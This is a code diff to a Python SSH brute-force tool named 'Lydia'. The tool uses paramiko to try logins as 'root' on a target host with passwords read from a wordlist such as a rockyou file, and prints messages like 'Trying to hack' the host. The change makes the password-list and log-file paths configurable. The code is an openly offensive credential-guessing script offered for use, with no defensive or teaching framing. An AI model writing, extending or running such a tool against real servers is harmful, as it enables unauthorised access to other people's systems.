@@ -6,9 +6,11 @@ from termcolor import colored
 username = "root"
 
 class Lydia:
-    def __init__(self, host, threadnr) -> None:
+    def __init__(self, host, threadnr, passlistpath, logfilepath) -> None:
         self.host = host
         self.threadnr = threadnr
+        self.logfilepath = logfilepath
+        self.passlistpath = passlistpath
     def tryConnect(self, host, n, p):
         client = paramiko.client.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -19,9 +21,9 @@ class Lydia:
             return False
     def hack(self):
         print("[" + colored("Thread " + self.threadnr, "red") + "][" + colored("INFO", "cyan") + "] Trying to hack " + colored(self.host, "magenta") + " now...")
-        logfile = open("logs.txt", "a", encoding = 'utf-8', errors = 'ignore')
+        logfile = open(self.logfilepath, "a", encoding = 'utf-8', errors = 'ignore')
         logfile.write(self.host + ":\n")
-        with open("rockyoufirst.txt", 'r', encoding = 'utf-8', errors = 'ignore') as passfile:
+        with open(self.passlistpath, 'r', encoding = 'utf-8', errors = 'ignore') as passfile:
             lines = passfile.readlines()
         for line in lines:
             line = line.strip()
